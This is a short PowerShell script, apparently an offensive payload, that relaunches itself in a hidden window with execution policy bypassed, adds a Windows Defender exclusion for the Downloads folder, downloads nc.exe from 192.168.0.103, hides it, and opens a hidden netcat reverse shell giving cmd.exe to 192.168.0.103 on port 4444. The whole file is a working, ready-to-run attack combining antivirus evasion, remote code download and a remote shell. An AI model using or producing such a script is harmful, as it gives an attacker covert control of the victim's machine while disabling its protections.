function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" `
            -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}
Ensure-WindowsPowerShell

try {
    # ✅ Exclude Downloads from Defender scanning (silently fails if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
} catch {}

try {
    # ✅ Download nc.exe into Downloads folder
    $ncUrl = "http://192.168.0.103/nc.exe"
    $ncPath = "$env:USERPROFILE\Downloads\nc.exe"

    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing

    # ✅ Unblock and hide it
    Unblock-File -Path $ncPath
    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
} catch {
    Write-Error "❌ Download/unblock failed: $_"
    exit
}

try {
    # ✅ Launch netcat reverse shell using full path
    $host = "192.168.0.103"
    $port = 4444
    Start-Process -FilePath $ncPath -ArgumentList "$host $port -e cmd.exe" -WindowStyle Hidden
} catch {
    Write-Error "❌ Failed to start reverse shell: $_"
}
